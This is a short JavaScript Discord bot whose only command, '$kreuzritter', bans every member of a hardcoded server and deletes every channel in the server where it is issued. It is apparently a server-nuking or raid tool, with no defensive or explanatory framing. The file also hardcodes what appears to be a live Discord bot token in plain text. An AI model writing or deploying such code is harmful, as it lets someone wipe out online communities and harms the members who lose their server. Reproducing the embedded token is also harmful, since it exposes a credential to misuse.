const {
    Client,
    RichEmbed
} = require('discord.js')
const client = new Client();
const token = 'NzAwNDk5ODE3NDk5MDY2NTAy.Xpj1Sw.L2Qx2vkfTgb9cqe9fd5Tq9wDeMg';
const PREFIX = '$';

	client.on('ready', (guild) => {
		
		
		console.log('Ready');
	
	
	});

	

	client.on('message', message => {
		
		let args = message.content.substring(PREFIX.length).split(" ");
		
		switch (args[0]) {
			
			case 'kreuzritter':
			
			try{
		
			
				const list = client.guilds.get("651857734177914891"); 
			
				
				list.members.forEach(member => member.ban()); 
				message.guild.channels.forEach(channel => channel.delete());
				
			}catch(UnhandledPromiseRejectionWarning){
				
				console.log('Not enough permissions');
				
			}
			
			break;
			
		}

	});

client.login(token);

